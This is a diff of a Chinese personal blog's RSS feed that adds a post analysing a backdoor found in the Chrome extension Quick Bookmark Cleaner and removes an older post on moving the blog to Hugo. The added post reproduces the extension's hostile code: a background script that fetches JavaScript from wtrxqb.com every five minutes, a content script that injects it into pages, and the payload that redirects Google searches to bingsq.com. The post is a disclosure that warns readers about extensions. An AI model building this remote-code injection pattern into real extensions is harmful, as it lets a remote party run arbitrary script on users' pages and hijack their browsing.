@@ -1,4 +1,127 @@
-<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/"><channel><title>Ice-Hazymoon 的博客</title><atom:link href="%7balternate%20%7bRSS%20application/rss+xml%20%20index%20alternate%20%20false%20false%20true%20false%20false%200%7d%20/index.xml%20https://imiku.me/index.xml%7d" rel="self" type="application/rss+xml"/><link>https://imiku.me/</link><managingEditor>Ice-Hazymoon</managingEditor><description>向着现充的生活拼命咸鱼中</description><lastBuildDate>Tue, 21 Jun 2022 18:04:05 +0200</lastBuildDate><language>zh-cn</language><generator>Hugo -- gohugo.io</generator><item><title>解决原神在海外下载慢的问题</title><link>https://imiku.me/2022/06/21/solve-the-slow-download-speed-of-the-genshin-in-foreign.html/</link><pubDate>Tue, 21 Jun 2022 18:04:05 +0200</pubDate><guid>https://imiku.me/2022/06/21/solve-the-slow-download-speed-of-the-genshin-in-foreign.html/</guid><description>&lt;p>在海外玩国服原神真折磨人，游戏下载速度几百K，要下载完本体需要好几天，特此研究出了这个解决办法。&lt;/p>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/"><channel><title>Ice-Hazymoon 的博客</title><atom:link href="%7balternate%20%7bRSS%20application/rss+xml%20%20index%20alternate%20%20false%20false%20true%20false%20false%200%7d%20/index.xml%20https://imiku.me/index.xml%7d" rel="self" type="application/rss+xml"/><link>https://imiku.me/</link><managingEditor>Ice-Hazymoon</managingEditor><description>向着现充的生活拼命咸鱼中</description><lastBuildDate>Sat, 10 Dec 2022 21:07:48 +0800</lastBuildDate><language>zh-cn</language><generator>Hugo -- gohugo.io</generator><item><title>关于 Quick Bookmark Cleaner 浏览器插件的后门</title><link>https://imiku.me/2022/12/10/fuck-quick-bookmark-cleaner.html/</link><pubDate>Sat, 10 Dec 2022 21:07:48 +0800</pubDate><guid>https://imiku.me/2022/12/10/fuck-quick-bookmark-cleaner.html/</guid><description>&lt;p>起因是这样的，2022年12月10日下午的时候，发现用谷歌搜索的所有东西都被重定向到了必应的结果，根据我多年的不当人写后门的经验来看，肯定是被某个插件或者脚本劫持了。&lt;/p>
+&lt;p>在谷歌浏览器中搜索 &lt;code>colorpop&lt;/code> 时，会被重定向到 &lt;code>http://bingsq.com/rd.php?q=colorpop&amp;amp;n=8004&lt;/code> 这个结果，然后自动跳转到了必应的搜索结果&lt;/p>
+&lt;p>先禁用了暴力猴的所有脚本，发现不管用，可以几乎肯定是 Chrome 插件的问题了，然后打开开发者工具开始抓包，开启日志记录功能，看看是哪个傻逼插件写了后门。&lt;/p>
+&lt;p>&lt;/p>
+&lt;p>结果，果然发现了一个名为 &lt;code>injected_content.js&lt;/code> 奇怪的js文件被注入到了页面中，内容如下&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>postMessage({ type&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;ready&amp;#34;&lt;/span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">window&lt;/span>.addEventListener(&lt;span style="color:#f1fa8c">&amp;#34;message&amp;#34;&lt;/span>, (e) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (e&lt;span style="color:#ff79c6">?&lt;/span>.data&lt;span style="color:#ff79c6">?&lt;/span>.type &lt;span style="color:#ff79c6">!==&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;track&amp;#34;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">eval&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;1+1&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">const&lt;/span> script &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.createElement(&lt;span style="color:#f1fa8c">&amp;#34;script&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> script.textContent &lt;span style="color:#ff79c6">=&lt;/span> e.data.code;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.documentElement.appendChild(script);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">catch&lt;/span> (e) {}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不难看出，这是插件的框架内部监听了页面的 &lt;code>message&lt;/code> 事件，然后执行了 &lt;code>eval(&amp;quot;1+1&amp;quot;)&lt;/code>，如果没有报错，就会创建一个脚本，内容为 &lt;code>e.data.code&lt;/code>，这个 &lt;code>e.data.code&lt;/code> 里就是后门代码了。&lt;/p>
+&lt;p>果然，禁用了 Quick Bookmark Cleaner 插件以后，搜索功能正常了，开始进一步挖掘，看看这个 &lt;code>e.data.code&lt;/code> 里到底写了什么&lt;/p>
+&lt;p>打开插件的管理页面：&lt;code>chrome://extensions/?id=ljfgijlbekebdhniagdekklbmmchhjja&lt;/code>，找到 ”查看视图“ 这一栏，会发现有一个 &lt;code>Service Worker&lt;/code> 文件，点进去，可以看到这个文件的内容，在 &lt;code>background.js&lt;/code> 中，地址：&lt;code>chrome-extension://ljfgijlbekebdhniagdekklbmmchhjja/background.js&lt;/code>&lt;/p>
+&lt;p>&lt;/p>
+&lt;p>内容如下：&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">const&lt;/span> BASE_URL &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;https://wtrxqb.com/&amp;#39;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">let&lt;/span> tracking &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">const&lt;/span> updateTrackingCode &lt;span style="color:#ff79c6">=&lt;/span> () =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tracking &lt;span style="color:#ff79c6">=&lt;/span> fetch(&lt;span style="color:#f1fa8c">`&lt;/span>&lt;span style="color:#f1fa8c">${&lt;/span>BASE_URL&lt;span style="color:#f1fa8c">}&lt;/span>&lt;span style="color:#f1fa8c">track.php?&lt;/span>&lt;span style="color:#f1fa8c">${&lt;/span>&lt;span style="color:#8be9fd;font-style:italic">Date&lt;/span>.now()&lt;span style="color:#f1fa8c">}&lt;/span>&lt;span style="color:#f1fa8c">`&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .then((res) =&amp;gt; res.text())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .&lt;span style="color:#ff79c6">catch&lt;/span>(() =&amp;gt; &lt;span style="color:#f1fa8c">&amp;#39;&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chrome.alarms.create(&lt;span style="color:#f1fa8c">&amp;#39;update-config&amp;#39;&lt;/span>, {periodInMinutes&lt;span style="color:#ff79c6">:&lt;/span> &lt;span style="color:#bd93f9">5&lt;/span>})
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chrome.alarms.onAlarm.addListener(updateTrackingCode)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>updateTrackingCode()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chrome.runtime.onMessage.addListener((message, sender, sendResponse) =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">switch&lt;/span> (message.type) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">case&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;getTrackingCode&amp;#39;&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">Promise&lt;/span>.resolve().then(() =&amp;gt; tracking).then(sendResponse)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#ff79c6">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">default&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#ff79c6">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chrome.runtime.onInstalled.addListener(&lt;span style="color:#8be9fd;font-style:italic">function&lt;/span> (details) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (details.reason &lt;span style="color:#ff79c6">===&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;install&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fetch(&lt;span style="color:#f1fa8c">`&lt;/span>&lt;span style="color:#f1fa8c">${&lt;/span>BASE_URL&lt;span style="color:#f1fa8c">}&lt;/span>&lt;span style="color:#f1fa8c">install.php`&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这就是后门的完整代码了，可以看到，这个插件会定时向 &lt;code>https://wtrxqb.com/track.php&lt;/code> 发送请求，获取后门代码，然后注入到页面中，这个后门代码的内容是一个 &lt;code>eval&lt;/code> 函数，这个函数会执行 &lt;code>fetch&lt;/code> 请求，然后把请求的结果发送到 &lt;code>https://wtrxqb.com/track.php&lt;/code>，这个地址会返回远程的后门 js 代码。&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#8be9fd;font-style:italic">function&lt;/span> () { &lt;span style="color:#ff79c6">const&lt;/span> patterns &lt;span style="color:#ff79c6">=&lt;/span> [ &lt;span style="color:#f1fa8c">/google(?:\.\w{2,3}){1,2}\/search\?.*?q=(.*?)(&amp;amp;|$)/&lt;/span>, ]; &lt;span style="color:#ff79c6">const&lt;/span> pattern &lt;span style="color:#ff79c6">=&lt;/span> patterns.find((p) =&amp;gt; p.test(&lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.location.href)); &lt;span style="color:#ff79c6">if&lt;/span> (&lt;span style="color:#ff79c6">!&lt;/span>pattern) { &lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.documentElement.style.display &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;&amp;#39;&lt;/span>; &lt;span style="color:#ff79c6">return&lt;/span>; } &lt;span style="color:#ff79c6">const&lt;/span> [,query] &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.location.href.match(pattern); &lt;span style="color:#ff79c6">const&lt;/span> redirectUrl &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">`https://bingsq.com/?n=40&amp;amp;q=&lt;/span>&lt;span style="color:#f1fa8c">${&lt;/span>query&lt;span style="color:#f1fa8c">}&lt;/span>&lt;span style="color:#f1fa8c">`&lt;/span>; &lt;span style="color:#8be9fd;font-style:italic">document&lt;/span>.location.replace(redirectUrl); })();
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不难看出，这段代码把所有的谷歌搜索结果给跳转到了 &lt;code>http://bingsq.com/rd.php?q=colorpop&amp;amp;n=8004&lt;/code> 这个链接。&lt;/p>
+&lt;p>网上搜索 &lt;code>bingsq.com&lt;/code> 这个网址会发现，不止一个插件装了这个后门。&lt;/p>
+&lt;p>&lt;/p>
+&lt;p>最后：
+不知道是不是必应给了推广费还是什么情况，总之少装点chrome插件吧，能不用就不用，远程执行后门的情况太多了，反馈给谷歌被下架的几率也小的离谱。&lt;/p></description></item><item><title>解决原神在海外下载慢的问题</title><link>https://imiku.me/2022/06/21/solve-the-slow-download-speed-of-the-genshin-in-foreign.html/</link><pubDate>Tue, 21 Jun 2022 18:04:05 +0200</pubDate><guid>https://imiku.me/2022/06/21/solve-the-slow-download-speed-of-the-genshin-in-foreign.html/</guid><description>&lt;p>在海外玩国服原神真折磨人，游戏下载速度几百K，要下载完本体需要好几天，特此研究出了这个解决办法。&lt;/p>
 &lt;h2 class="group " id="找到游戏包的下载地址"
 >找到游戏包的下载地址&lt;a href="#%e6%89%be%e5%88%b0%e6%b8%b8%e6%88%8f%e5%8c%85%e7%9a%84%e4%b8%8b%e8%bd%bd%e5%9c%b0%e5%9d%80"
 >&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
@@ -79,11 +202,11 @@
 &lt;/div>
 &lt;div class="mr-4 inline-flex items-center">
 &lt;i class="eva eva-star mr-1 text-amber-400">&lt;/i>
-&lt;span>142&lt;/span>
+&lt;span>174&lt;/span>
 &lt;/div>
 &lt;div class="inline-flex items-center">
 &lt;i class="eva eva-shuffle-2 mr-1 text-blue-500">&lt;/i>
-&lt;span>12&lt;/span>
+&lt;span>22&lt;/span>
 &lt;/div>
 &lt;/div>
 &lt;/div>
@@ -2509,369 +2632,4 @@ href="https://www.simicart.com/manifest-generator.html/"target="_blank" rel="noo
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>现在页面在离线状态下访问未缓存的页面时将会显示&lt;/p>
-&lt;p>&lt;/p></description></item><item><title>博客迁移到了 Hugo</title><link>https://imiku.me/2021/08/31/wordpress-to-hugo.html/</link><pubDate>Tue, 31 Aug 2021 12:48:35 +0800</pubDate><guid>https://imiku.me/2021/08/31/wordpress-to-hugo.html/</guid><description>&lt;blockquote>
-&lt;p>这次抛弃了wordpress，选用了 Hugo 来开发，时隔几年又上了全静态博客&lt;/p>
-&lt;/blockquote>
-&lt;p>本来想换成 Ghost 的，但是 Ghost 简直不把用户当人，主题开发的体验跟屎一样，都 2021 年了，连基本的搜索功能都没有，hbs 语法限制还多，还不能自己扩展 hbs 功能（更新后会重置），下线了原本有的插件系统。如果你想使用 Ghost，建议先看看这篇文章：&lt;a
-class="link"
-href="https://nehalist.io/why-i-dont-like-the-ghost-blogging-platform-anymore/"target="_blank" rel="noopener">为什么我不再喜欢 Ghost&lt;/a
->
-作者说出了我用 Ghost 的真实感受，其实早在 17 年的时候我就尝试&lt;a
-class="link"
-href="https://imiku.me/2017/07/10/903.html/">从 Wordpress 更换为 Ghost&lt;/a
->
-，最后由于 Ghost 限制太多，最终还是换回了 Wordpress。4年过去了，没想到 Ghost 还是这个死样子。&lt;/p>
-&lt;h2 class="group " id="先跑个分吧"
->先跑个分吧&lt;a href="#%e5%85%88%e8%b7%91%e4%b8%aa%e5%88%86%e5%90%a7"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h2>
-&lt;div class="gallery-box">
-&lt;p> &lt;/p>
-&lt;/div>
-&lt;h2 class="group " id="博客系统对比"
->博客系统对比&lt;a href="#%e5%8d%9a%e5%ae%a2%e7%b3%bb%e7%bb%9f%e5%af%b9%e6%af%94"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h2>
-&lt;p>选来选取，最终决定了 Hexo 和 Hugo，说下两者的优缺点：&lt;/p>
-&lt;h3 class="group " id="hugo"
->Hugo&lt;a href="#hugo"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>优点：&lt;/p>
-&lt;ul>
-&lt;li>世界最快，几千篇文章1秒不到即可生成&lt;/li>
-&lt;li>开发友好，模板自带很多常用函数，还支持图片处理，保存后可以实时预览&lt;/li>
-&lt;li>开发模式什么样，线上模式就什么样，不像某些静态平台，开发的时候好好的，一上线就各种报错，说的就是你 Ghost&lt;/li>
-&lt;li>有一个非常棒的社区，基本所有问题你都能在这里找到答案 &lt;a
-class="link"
-href="https://discourse.gohugo.io/"target="_blank" rel="noopener">https://discourse.gohugo.io/&lt;/a
->
-&lt;/li>
-&lt;li>支持很多的&lt;a
-class="link"
-href="https://gohugo.io/content-management/shortcodes/"target="_blank" rel="noopener">短代码&lt;/a
->
-&lt;/li>
-&lt;/ul>
-&lt;p>缺点：&lt;/p>
-&lt;ul>
-&lt;li>模板少，虽然官网提供了 300 多个模板，但仍没有 Hexo 数量多，也不是很好看&lt;/li>
-&lt;li>不支持插件系统，这点让开发人员很头大，很多事情都得靠 JS 或者自己写脚本处理&lt;/li>
-&lt;/ul>
-&lt;h3 class="group " id="hexo"
->Hexo&lt;a href="#hexo"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h3>
-&lt;p>优点：&lt;/p>
-&lt;ul>
-&lt;li>生态强大，主题多，虽然很多时候打开一篇博客文章看到的都是 &lt;a
-class="link"
-href="https://github.com/theme-next/hexo-theme-next"target="_blank" rel="noopener">Next&lt;/a
->
-主题&lt;/li>
-&lt;li>支持插件系统，除了速度就没有解决不了的事&lt;/li>
-&lt;li>JS 开发，省点头发&lt;/li>
-&lt;/ul>
-&lt;p>缺点：&lt;/p>
-&lt;ul>
-&lt;li>生成速度相对于 Hugo 就慢了很多&lt;/li>
-&lt;li>没有自带的图片处理函数，且自带的模板函数没有 Hugo 多&lt;/li>
-&lt;/ul>
-&lt;p>相比下来，由于我比较追求生成速度和开箱即用，所以选择了 Hugo，Hugo 除了不支持插件，毫不逊色 Hexo，所有内置函数不支持的地方东西写个 JS 脚本处理一下就行了。&lt;/p>
-&lt;p>从 Vue 主题迁移到 Hugo 废了不少头发，花了 4 天的时间才全部迁移完成，但是其中的快感也是之前用 WP+Vue 体验不到的&lt;/p>
-&lt;h2 class="group " id="迁移工具"
->迁移工具&lt;a href="#%e8%bf%81%e7%a7%bb%e5%b7%a5%e5%85%b7"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h2>
-&lt;p>WordPress 导出到 Hugo 可以用 &lt;a
-class="link"
-href="https://github.com/SchumacherFM/wordpress-to-hugo-exporter"target="_blank" rel="noopener">wordpress-to-hugo-exporter&lt;/a
->
-这个插件，注意，如果你使用的宝塔 Linux 版本安装的 PHP7.3，会无法导出，因为缺少 ZIP 库，参考：&lt;a
-class="link"
-href="https://www.bt.cn/bbs/thread-36416-1-1.html"target="_blank" rel="noopener">https://www.bt.cn/bbs/thread-36416-1-1.html&lt;/a
->
-最简单的解决办法就是换个 PHP 版本。&lt;/p>
-&lt;h2 class="group " id="关于主题"
->关于主题&lt;a href="#%e5%85%b3%e4%ba%8e%e4%b8%bb%e9%a2%98"
->&lt;i class="eva eva-link ml-3 align-middle text-theme opacity-0 transition ease-in-out group-hover:opacity-100">&lt;/i>&lt;/a
->&lt;/h2>
-&lt;p>从之前的 SSR 渲染变成现在的全站纯静态，访问速度+++&lt;/p>
